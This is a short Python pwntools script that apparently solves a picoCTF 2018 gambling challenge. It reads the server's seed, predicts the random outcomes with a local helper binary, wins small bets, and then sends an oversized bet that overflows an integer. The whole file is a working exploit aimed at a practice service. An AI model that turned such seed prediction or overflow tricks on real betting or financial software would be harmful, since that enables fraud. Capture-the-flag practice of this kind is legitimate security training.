from pwn import *
import re

LONG_MAX = 0x7FFFFFFF

r = remote("2018shell.picoctf.com", 21444)

r.recvline()
line = r.recvline()
print line
seed = re.search("\$(\d+)", line).group(1)
log.info("Seed: {}".format(seed))

rand_rol = process(["./rand_rol", str(seed)])
random_values = rand_rol.recvall()
random_arr = random_values.split("\n")

log.info("Random values: {}".format(random_arr))

def make_bet(amount, number):
    log.info("Making bet: Amount: {}, number: {}".format(amount, number))
    r.recvuntil("> ")
    r.sendline(str(amount))
    r.recvuntil("> ")
    r.sendline(str(number))
    for i in range(7):
        line = r.recvline().strip()
        if line != "":
            print line


for i in range(3):
    number = random_arr.pop(0)
    random_arr.pop(0)
    make_bet(1, number)

make_bet(LONG_MAX + 100000000, 1)
print r.recvall()